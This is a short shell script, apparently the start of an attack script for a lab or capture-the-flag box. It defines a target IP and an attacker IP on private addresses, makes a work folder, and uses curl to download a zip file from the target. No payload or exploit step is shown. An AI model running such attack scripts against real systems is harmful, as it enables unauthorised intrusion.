#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.221.125"
attack_ip="10.10.190.240"

# Prepare environment
mkdir /work/ 2>/dev/null

# Retrieving conversion
echo "1 - RETRIEVING CONVERTED FILES"
curl -s -X GET "http://$target_ip/download" -L -o /work/01-download.zip > /dev/null